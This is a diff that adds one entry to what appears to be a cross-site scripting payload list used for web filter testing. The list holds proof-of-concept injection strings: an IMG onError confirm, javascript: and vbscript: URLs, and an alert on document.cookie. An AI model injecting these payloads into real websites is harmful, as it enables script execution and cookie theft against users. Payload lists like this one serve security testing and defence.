@@ -418,6 +418,7 @@ foo\�; alert(document.cookie);//�;
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
 <IMG SRC='vbscript:msgbox("XSS")'>
 <IMG SRC="livescript:[code]">
+<IMG SRC=M onError=confirm`XSS`>
 <BODY ONLOAD=alert('XSS')>
 <BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
